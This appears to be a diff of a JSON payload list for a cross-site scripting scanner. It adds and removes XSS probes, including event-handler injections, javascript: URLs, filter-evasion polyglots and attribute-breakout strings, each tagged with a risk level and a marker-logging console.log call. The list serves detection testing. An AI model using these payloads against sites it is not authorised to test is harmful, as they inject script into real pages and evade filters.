@@ -10,16 +10,9 @@
   "event_handler": [
     {"value": "<img src=x onerror=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "execution"},
     {"value": "<svg/onload=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "execution"},
-    {"value": "<body onload=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "execution"},
     {"value": "<div onmouseover=console.log('{{MARKER}}')>hover me</div>", "risk_level": "Medium", "impact": "user_interaction_required"},
     {"value": "<a onmouseover=console.log('{{MARKER}}')>hover</a>", "risk_level": "Medium", "impact": "user_interaction_required"},
     {"value": "<input onfocus=console.log('{{MARKER}}') autofocus>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<marquee onstart=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<video><source onerror=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<details open ontoggle=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<svg><animate onbegin=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<select autofocus onfocus=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<textarea autofocus onfocus=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
     {"value": "<audio src=x onerror=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"}
   ],
 
@@ -32,19 +25,12 @@
 
   "protocol": [
     {"value": "<a href=javascript:console.log('{{MARKER}}')>click</a>", "risk_level": "Medium", "impact": "user_interaction_required"},
-    {"value": "<iframe src=javascript:console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
     {"value": "<object data='data:text/html,<script>console.log(\"{{MARKER}}\")</script>'>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<embed src='data:text/html,<script>console.log(\"{{MARKER}}\")</script>'>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<form action=javascript:console.log('{{MARKER}}')><input type=submit>", "risk_level": "Medium", "impact": "form_hijacking"},
     {"value": "<a href='javascript&colon;console.log(\"{{MARKER}}\")'>click</a>", "risk_level": "High", "impact": "waf_evasion"}
   ],
 
   "modern_html5": [
-    {"value": "<details/open/ontoggle=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<svg/onload=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "execution"},
-    {"value": "<iframe/srcdoc=\"<svg/onload=console.log('{{MARKER}}')>\">", "risk_level": "High", "impact": "waf_evasion"},
-    {"value": "<video><source onerror=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "auto_execution"},
-    {"value": "<math><mi xlink:href=data:x,<script>console.log('{{MARKER}}')</script>>", "risk_level": "High", "impact": "waf_evasion"}
+    {"value": "<svg/onload=console.log('{{MARKER}}')>", "risk_level": "High", "impact": "execution"}
   ],
 
   "spa_frameworks": [
@@ -131,19 +117,9 @@
       "impact": "parentheses_bypass"
     },
     {
-      "value": "<template shadowroot=\"open\" onbeforematch=\"console.log('{{MARKER}}')\">",
-      "risk_level": "High",
-      "impact": "shadow_dom_injection"
-    },
-    {
       "value": "<form><button formaction=javascript&colon;console.log('{{MARKER}}')>X</button></form>",
       "risk_level": "High",
       "impact": "formaction_hijacking"
-    },
-    {
-      "value": "<style onload=console.log('{{MARKER}}')>",
-      "risk_level": "High",
-      "impact": "uncommon_event_handler"
     },
     {
       "value": "<iframe srcdoc=\"&lt;script&gt;console.log('{{MARKER}}')&lt;/script&gt;\"></iframe>",
@@ -151,29 +127,9 @@
       "impact": "srcdoc_html_encoding"
     },
     {
-      "value": "<svg><animatetransform onbegin=console.log('{{MARKER}}') attributeName=transform>",
-      "risk_level": "High",
-      "impact": "svg_animation_execution"
-    },
-    {
       "value": "<script>{onerror=eval}throw{lineno:1,column:1,error:1,message:'console.log\\x28\\'{{MARKER}}\\'\\x29'}</script>",
       "risk_level": "Critical",
       "impact": "advanced_js_obfuscation"
-    },
-    {
-      "value": "<body onpageshow=console.log('{{MARKER}}')>",
-      "risk_level": "Medium",
-      "impact": "uncommon_event_handler"
-    },
-    {
-      "value": "<object data=\"javascript:console.log('{{MARKER}}')\">",
-      "risk_level": "High",
-      "impact": "object_injection"
-    },
-    {
-      "value": "<math><mtext><table><mglyph><style><math><mi xlink:href=javascript:console.log('{{MARKER}}')>Click</mi></math>",
-      "risk_level": "Critical",
-      "impact": "mathml_namespace_confusion"
     },
     {
       "value": "<a href=\"javascript&colon;console.log('{{MARKER}}')\">Click</a>",
@@ -189,57 +145,6 @@
       "value": "<portal src=\"javascript:console.log('{{MARKER}}')\"></portal>",
       "risk_level": "High",
       "impact": "modern_html_tag_abuse"
-    }
-  ],
-
-  "polyglot_refined": [
-    {
-      "value": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(console.log(\"{{MARKER}}\"))//'>",
-      "risk_level": "Critical",
-      "impact": "multi_context_bypass"
-    },
-    {
-      "value": "\"-console.log('{{MARKER}}')-\"<script>console.log('{{MARKER}}')</script>",
-      "risk_level": "High",
-      "impact": "attribute_breakout"
-    }
-  ],
-
-  "polyglot": [
-    {
-      "value": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=console.log('{{MARKER}}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=console.log('{{MARKER}}')//>",
-      "risk_level": "Critical",
-      "impact": "multi_context_execution"
-    },
-    {
-      "value": "'-console.log('{{MARKER}}')-'\"<script>console.log('{{MARKER}}')</script><img/src=x onerror=console.log('{{MARKER}}')>",
-      "risk_level": "Critical",
-      "impact": "multi_context_execution"
-    },
-    {
-      "value": "\"><img src=x onerror=console.log('{{MARKER}}')><\"",
-      "risk_level": "High",
-      "impact": "attribute_breakout"
-    },
-    {
-      "value": "'><script>console.log('{{MARKER}}')</script>",
-      "risk_level": "High",
-      "impact": "attribute_breakout"
-    },
-    {
-      "value": "</script><script>console.log('{{MARKER}}')</script>",
-      "risk_level": "High",
-      "impact": "tag_breakout"
-    },
-    {
-      "value": "\"onmouseover=console.log('{{MARKER}}') x=\"",
-      "risk_level": "High",
-      "impact": "attribute_injection"
-    },
-    {
-      "value": "'onmouseover=console.log('{{MARKER}}') x='",
-      "risk_level": "High",
-      "impact": "attribute_injection"
     }
   ]
 }
